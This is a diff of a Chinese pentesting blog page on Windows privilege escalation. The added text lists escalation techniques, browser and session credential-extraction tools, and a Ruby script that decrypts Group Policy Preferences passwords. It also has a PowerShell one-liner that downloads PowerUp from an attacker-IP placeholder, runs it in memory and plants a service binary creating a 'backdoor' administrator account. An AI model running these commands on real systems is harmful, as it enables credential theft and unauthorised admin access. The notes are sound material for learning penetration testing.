@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="owefsad&#39;s blog">
 <meta property="og:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-05-12T15:57:49.955Z">
+<meta property="og:updated_time" content="2019-05-15T23:53:39.827Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pentesting test in windows">
 <meta name="twitter:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
@@ -245,18 +245,47 @@
 <h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" target="_blank" rel="noopener">how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478</a><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/" target="_blank" rel="noopener">wendels-small-hacking-tricks-microsoft-sql-server-edition</a><br><a href="https://www.cnblogs.com/ichunqiu/p/7249516.html" target="_blank" rel="noopener">详述MSSQL服务在渗透测试中的利用</a><br><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a><br><a href="https://medium.com/ethical-hacking-blog/mssql-connectivity-with-sqsh-debec7188104" target="_blank" rel="noopener">mssql-client: sqsh</a><br><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">攻击mssql的存储过程</a><br><a href="https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/" target="_blank" rel="noopener">llmnr-nbtns-poisoning-using-responder</a></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>Windows下通用的提权方法为:</p>
 <ul>
-<li>查找未打补丁的漏洞</li>
-<li>从exploit-db、github上搜索当前os对应的exp</li>
-<li>浏览器保存的凭证: enum_ie、enum_chrome等等</li>
-<li>从保存的会话中搜索信息: putty、SuperPutty、FileZilla、WinSCP、RDP</li>
-<li>Hot Potato</li>
-<li>PowerUp by will</li>
+<li>提取保存的凭证(IE、Chrome、Firefox、Putty、SuperPutty、FileZilla、WinSCP、RDP、enum_ie、enum_chrome、firefox_decrypt、chromepass、等)</li>
+<li>Windows内核攻击</li>
+<li>DLL注入</li>
+<li>Dll劫持</li>
+<li>无人值守文件</li>
+<li>不安全的文件/目录权限</li>
+<li>不安全的服务权限</li>
+<li>组策略首选项</li>
+<li>不带引号的服务路径</li>
+<li>始终安装Elevated</li>
+<li>令牌操作</li>
+<li>不安全的注册表权限</li>
+<li>自动登陆的账号凭据</li>
+<li>User Account Control(UAC) ByPass</li>
+<li>不安全的命名管道权限</li>
 </ul>
-<p><strong>1.查找未打补丁的漏洞</strong><br>powershell script查看已打的补丁<br><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalldOn</span><br></pre></td></tr></table></figure></p>
-<p><strong>2.提取浏览器中保存的凭证</strong><br>chrome: <a href="https://github.com/hassaanaliw/chromepass" target="_blank" rel="noopener">chromepass</a><br>firefox: <a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener">firefox_decrypt</a></p>
+<p>ps://待查询的工具: Hot Potato</p>
+<blockquote>
+<p>1.Windows内核攻击</p>
+</blockquote>
+<p>powershell script查看已打的补丁<br><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalldOn</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>2.提取保存的凭证</p>
+</blockquote>
+<p>chrome: <a href="https://github.com/hassaanaliw/chromepass" target="_blank" rel="noopener">chromepass</a><br>firefox: <a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener">firefox_decrypt</a><br>SessionGopher: <a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noopener">powershell script</a></p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python chromepass.py -d</span><br><span class="line">$ python firefox_decrypt.py</span><br></pre></td></tr></table></figure>
-<p><strong>3.从保存的会话中搜索信息</strong><br>SessionGopher: <a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noopener">powershell script</a></p>
-<h4 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h4><p>youtube - Windows Privilege Escalation</p>
+<blockquote>
+<p>8.组策略首选项</p>
+</blockquote>
+<p>在Windows域环境中, 有时需要从域控下发全局组策略在域内机器上执行, 这时候会用到SYSVOS的共享目录, 共享目录中存放用于执行组策略的账户和加密后的密钥. 该功能在Windows Server 2008中引入, 组策略首选项中指定的账户的凭证被加密存储在Groups.xml文件中, 密码为XML中的<strong>cpassword</strong>字段。</p>
+<p>微软公开了用于加密的公钥创建并被公开, 因此组策略中的密码可以被破解； 组策略中一般指定Administrator账号, 所以一旦破解便可以用管理员身份登陆主机实现提权。</p>
+<p>Groups.xml文件存储在共享文件中, 任何经过身份验证的用户都可以读取该文件, 因为访问该文件才能够进行组策略更新。 为了利用该问题, 需要寻找groups.xml文件的位置。<br>用于加密存储的公钥如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8</span><br><span class="line">f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b</span><br></pre></td></tr></table></figure></p>
+<p><strong>破解工具</strong><br><a href="http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip" target="_blank" rel="noopener">gp3finder</a><br><a href="http://www.twitter.com/carnal0wnage" target="_blank" rel="noopener">carnal0wnage</a>编写的ruby脚本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'rubygems'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"> </span><br><span class="line">encrypted_data = <span class="string">"j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted_data)</span></span></span><br><span class="line">padding = <span class="string">"="</span> * (<span class="number">4</span> - (encrypted_data.length % <span class="number">4</span>))</span><br><span class="line">epassword = <span class="string">"<span class="subst">#&#123;encrypted_data&#125;</span><span class="subst">#&#123;padding&#125;</span>"</span></span><br><span class="line">decoded = Base64.decode64(epassword)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\</span></span><br><span class="line"><span class="string">x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\</span></span><br><span class="line"><span class="string">x33\xb6\x6c\x1b"</span></span><br><span class="line">aes = OpenSSL::Cipher::Cipher.new(<span class="string">"AES-256-CBC"</span>)</span><br><span class="line">aes.decrypt</span><br><span class="line">aes.key = key</span><br><span class="line">plaintext = aes.update(decoded)</span><br><span class="line">plaintext &lt;&lt; aes.final</span><br><span class="line">pass = plaintext.unpack(<span class="string">'v*'</span>).pack(<span class="string">'C*'</span>) <span class="comment"># UNICODE conversion </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> pass</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"> </span><br><span class="line">blah = decrypt(encrypted_data)</span><br><span class="line">puts blah</span><br></pre></td></tr></table></figure></p>
+<p><a href="post/windows/gather/credentials/gpp">metasploit</a></p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerShplit</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Get-CachedGPPPassword //For locally stored GP Files</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>9.不带引号的服务路径</p>
+</blockquote>
+<p><strong>简介</strong><br>Windows的目录支持空格, 含有空格的目录被引用时安全的做法是用双引号闭合路径, 如果含有空格的路径未闭合windows将从左向右开始解析, 比如: <code>C:\Program File\360 service\av.exe</code>, windows将先后查找:<code>C:\Program.exe</code>、<code>C:\Program File\360.exe</code>、<code>C:\Program File\360 service\av.exe</code>, 一旦找到经运行对应的文件.<br>Windows下的服务一般以SYSTEM权限或Administrator权限运行, 当服务的程序路径(BINARY_PATH_NAME)中包含空格时, 如果对应的目录可写则可以向目录中写入对应的恶意程序, 然后手工重启服务或等待服务重启时运行恶意程序进行提权.</p>
+<p><strong>PowerUp Exp</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 运行下面的命令将从远程下载powerup.ps并在内存中运行, 然后在unquoted service的可利用目录下写入恶意程序创建管理员账号: backdoor/Password123!</span><br><span class="line">$ powershell.exe -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://&lt;attack&apos;s ip&gt;/PowerUp.ps1&apos;); Write-ServiceBinary -ServiceName &lt;target service name&gt; -Path &lt;target service unquoted path&gt; -UserName backdoor -Password Password123!&quot;</span><br></pre></td></tr></table></figure></p>
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="http://secvue.com/using-powerup-with-unquoted-service-paths/" target="_blank" rel="noopener">using-powerup-with-unquoted-service-paths</a><br><a href="https://www.gracefulsecurity.com/privesc-unquoted-service-path/" target="_blank" rel="noopener">privesc-unquoted-service-path</a><br>youtube - Windows Privilege Escalation<br><a href="https://pentestlab.blog/tag/cpassword/" target="_blank" rel="noopener">Group Policy Preferences</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp</a></p>
 
       
 
@@ -346,7 +375,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、信息收集"><span class="toc-number">2.</span> <span class="toc-text">一、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、服务利用"><span class="toc-number">3.</span> <span class="toc-text">二、服务利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-MsSql-Escalate-Privilege"><span class="toc-number">3.1.</span> <span class="toc-text">0x00 MsSql Escalate Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MsSql基本操作"><span class="toc-number">3.1.1.</span> <span class="toc-text">MsSql基本操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">3.1.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-number">4.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考内容"><span class="toc-number">4.0.1.</span> <span class="toc-text">参考内容</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一、信息收集"><span class="toc-number">2.</span> <span class="toc-text">一、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、服务利用"><span class="toc-number">3.</span> <span class="toc-text">二、服务利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-MsSql-Escalate-Privilege"><span class="toc-number">3.1.</span> <span class="toc-text">0x00 MsSql Escalate Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MsSql基本操作"><span class="toc-number">3.1.1.</span> <span class="toc-text">MsSql基本操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">3.1.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-number">4.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -500,14 +529,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">pip</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -524,11 +545,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pip</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">joomla</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
+                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -536,19 +565,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">crontab</a>
+                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">wmi</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -560,19 +581,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">url_brute</a>
+                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
+                <a href="javascript:void(0)" class="js-tag color3">crontab</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -584,15 +597,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">rce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">url_brute</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">latex</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
+                <a href="javascript:void(0)" class="js-tag color4">tty</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tty</a>
+                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
               </li>
              
               <li class="article-tag-list-item">
